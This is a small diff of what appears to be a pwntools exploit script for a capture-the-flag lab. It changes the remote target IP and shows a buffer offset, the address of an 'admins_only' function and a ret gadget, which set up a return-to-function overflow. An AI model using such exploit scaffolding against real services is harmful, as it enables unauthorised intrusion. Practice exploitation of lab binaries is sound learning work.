@@ -9,7 +9,7 @@ offset = 40
 admins_only = 0x0000000000401554
 ret = 0x0000000000401016
 
-p = remote('10.10.138.24', 9003)
+p = remote('10.10.206.177', 9003)
 
 p.sendlineafter(":", b"3")
 
